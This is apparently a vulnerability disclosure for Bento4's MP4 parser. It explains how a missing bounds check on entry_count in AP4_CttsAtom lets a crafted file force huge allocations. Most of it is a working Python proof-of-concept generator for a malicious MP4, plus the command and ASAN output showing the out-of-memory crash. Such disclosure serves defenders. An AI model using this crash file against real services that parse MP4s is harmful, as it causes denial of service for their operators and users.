## Bug0: AP4_CttsAtom Missing entry_count Bounds Check Causes Uncontrolled Memory Allocation

The `AP4_CttsAtom` constructor in `Ap4CttsAtom.cpp` reads `entry_count` from the stream at lines 79–80 without validating it against the declared atom size, allowing an attacker-controlled value to trigger unbounded heap allocations that exhaust process memory and crash the process.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

OUTPUT_FILE = "poc_input.mp4"


def box(box_type: bytes, payload: bytes) -> bytes:
    size = 8 + len(payload)
    return struct.pack(">I", size) + box_type + payload


def fullbox(box_type: bytes, version: int, flags: int, payload: bytes) -> bytes:
    vf = struct.pack(">I", (version << 24) | (flags & 0xFFFFFF))
    return box(box_type, vf + payload)


ftyp_payload = (
    b"M4A "
    + struct.pack(">I", 0)
    + b"M4A " + b"mp42" + b"isom"
)
ftyp = box(b"ftyp", ftyp_payload)

mvhd_payload = struct.pack(">IIIII", 0, 0, 44100, 0, 0x00010000)
mvhd_payload += struct.pack(">H", 0x0100)
mvhd_payload += b"\x00" * 10
mvhd_payload += struct.pack(">9i", 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
mvhd_payload += b"\x00" * 24
mvhd_payload += struct.pack(">I", 1)
assert len(mvhd_payload) == 96
mvhd = fullbox(b"mvhd", 0, 0, mvhd_payload)

tkhd_payload = struct.pack(">IIIII", 0, 0, 1, 0, 0)
tkhd_payload += b"\x00" * 8
tkhd_payload += struct.pack(">HHH", 0, 0, 0)
tkhd_payload += b"\x00" * 2
tkhd_payload += struct.pack(">9i", 0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
tkhd_payload += struct.pack(">II", 0, 0)
assert len(tkhd_payload) == 80
tkhd = fullbox(b"tkhd", 0, 3, tkhd_payload)

mdhd_payload = struct.pack(">IIII", 0, 0, 44100, 0)
mdhd_payload += struct.pack(">HH", 0x55C4, 0)
assert len(mdhd_payload) == 20
mdhd = fullbox(b"mdhd", 0, 0, mdhd_payload)

hdlr_payload = (
    struct.pack(">I", 0)
    + b"soun"
    + b"\x00" * 12
    + b"SoundHandler\x00"
)
hdlr = fullbox(b"hdlr", 0, 0, hdlr_payload)

smhd_payload = struct.pack(">HH", 0, 0)
smhd = fullbox(b"smhd", 0, 0, smhd_payload)

url_entry_payload = struct.pack(">I", 0x000001)
url_entry = box(b"url ", url_entry_payload)
dref_payload = struct.pack(">I", 1) + url_entry
dref = fullbox(b"dref", 0, 0, dref_payload)
dinf = box(b"dinf", dref)

stsd = fullbox(b"stsd", 0, 0, struct.pack(">I", 0))
stts = fullbox(b"stts", 0, 0, struct.pack(">I", 0))
stsc = fullbox(b"stsc", 0, 0, struct.pack(">I", 0))
stsz = fullbox(b"stsz", 0, 0, struct.pack(">II", 0, 0))
stco = fullbox(b"stco", 0, 0, struct.pack(">I", 0))

# Malicious ctts box: declared size=16 but entry_count=0x04000000 (67108864)
# This triggers ~256MB vector allocation and ~512MB buffer allocation
MALICIOUS_ENTRY_COUNT = 0x04000000
ctts_version_flags = struct.pack(">I", 0)
ctts_entry_count   = struct.pack(">I", MALICIOUS_ENTRY_COUNT)
ctts_payload       = ctts_version_flags + ctts_entry_count
ctts_size          = 16
ctts = struct.pack(">I", ctts_size) + b"ctts" + ctts_payload

stbl_payload = stsd + stts + stsc + stsz + stco + ctts
stbl = box(b"stbl", stbl_payload)
minf = box(b"minf", smhd + dinf + stbl)
mdia = box(b"mdia", mdhd + hdlr + minf)
trak = box(b"trak", tkhd + mdia)
moov = box(b"moov", mvhd + trak)
mp4_data = ftyp + moov

with open(OUTPUT_FILE, "wb") as f:
    f.write(mp4_data)

print(f"[+] PoC written to: {OUTPUT_FILE} ({len(mp4_data)} bytes)")
print(f"[+] Malicious ctts entry_count: 0x{MALICIOUS_ENTRY_COUNT:08X} ({MALICIOUS_ENTRY_COUNT})")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:hard_rss_limit_mb=512:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** AddressSanitizer: hard rss limit exhausted (512Mb vs 551Mb)
Root cause confirmed at Ap4CttsAtom.cpp lines 79-80: m_Entries.SetItemCount(0x04000000) triggers approximately 256MB vector allocation and new unsigned char[0x04000000 * 8] triggers approximately 512MB buffer allocation with no bounds check on entry_count against the declared atom size of 16 bytes.

### Impact

An attacker who supplies a crafted MP4 file with a ctts box that declares a minimal atom size but embeds a maximally large entry_count field can force the process to attempt allocations exceeding hundreds of megabytes, resulting in an out-of-memory crash and denial of service. This attack surface is exposed to any invocation of mp42aac or any other Bento4 tool that parses MP4 files on attacker-controlled input. No authentication or special privileges are required, and the file can be constructed in under 500 bytes.
